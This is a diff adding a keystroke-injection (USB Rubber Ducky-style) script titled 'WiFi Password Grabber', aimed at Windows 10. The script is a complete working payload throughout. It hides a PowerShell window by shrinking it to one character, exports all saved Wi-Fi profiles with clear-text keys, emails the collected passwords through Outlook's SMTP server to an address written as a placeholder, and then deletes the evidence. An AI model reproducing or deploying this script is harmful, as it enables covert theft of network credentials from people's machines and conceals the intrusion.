@@ -1,0 +1,75 @@
+REM Title:         WiFi Password Grabber
+REM Description:   Steals wifi passwords and sends them via email
+REM Author:        tom-martin01
+REM Version:       1.0
+REM Category:      Exfiltration
+REM Target:        Windows 10 (Powershell)
+REM Keyboad Language: GB
+REM --> Set Keyboard Language to GB
+LOCALE GB
+DELAY 2000
+REM --> Open Powershell
+WINDOWS d
+DELAY 500
+WINDOWS r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+REM --> Hide Powershell
+STRING [console]::WindowHeight=10
+ENTER
+STRING [console]::WindowWidth=10
+ENTER
+ALT SPACE
+STRING m
+LEFTARROW
+REPEAT 30
+STRING [console]::WindowHeight=5
+ENTER
+STRING [console]::WindowWidth=5
+ENTER
+ALT SPACE
+STRING m
+LEFTARROW
+REPEAT 10
+STRING [console]::WindowHeight=1
+ENTER
+STRING [console]::WindowWidth=1
+ENTER
+DELAY 1000
+REM --> Get WiFi Profiles and Passwords and save in WiFi-Loot.txt
+STRING cmd.exe /c netsh wlan export profile key=clear
+ENTER
+DELAY 500
+STRING Get-Content -Path WiFi*.xml > WiFi-Loot.txt
+ENTER
+DELAY 500
+REM --> Email The WiFi-Loot.txt file
+STRING $SMTPServer = 'smtp-mail.outlook.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSSL = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('<email address>', '<email password>')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = '<email address>'
+ENTER
+STRING $ReportEmail.To.Add('<email address>')
+ENTER
+STRING $ReportEmail.Subject = 'WiFi key grabber'
+ENTER
+STRING $ReportEmail.Body = (Get-Content WiFi-Loot.txt | out-string)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+REM --> Delete WiFi files and exit
+DELAY 3000
+STRING Remove-Item -Path WiFi*
+ENTER
+DELAY 500
+STRING exit
+ENTER
